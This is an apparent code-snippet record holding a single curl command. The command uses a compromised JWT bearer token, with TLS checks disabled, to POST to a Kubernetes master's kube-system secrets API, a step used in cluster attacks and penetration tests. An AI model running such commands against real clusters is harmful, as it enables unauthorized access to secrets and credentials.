---
id: 9f4bfbcd-9414-4301-a4d0-967a4f112a9e
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:01.304842+00:00'
updated_at: '2023-04-10T20:34:00.646741+00:00'
---

# Code Snippet 9f4bfbcd

**Language**: Powershell

```powershell
curl -k -v -X POST -H "Authorization: Bearer <COMPROMISED JWT TOKEN>" -H "Content-Type: application/json" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secret
```
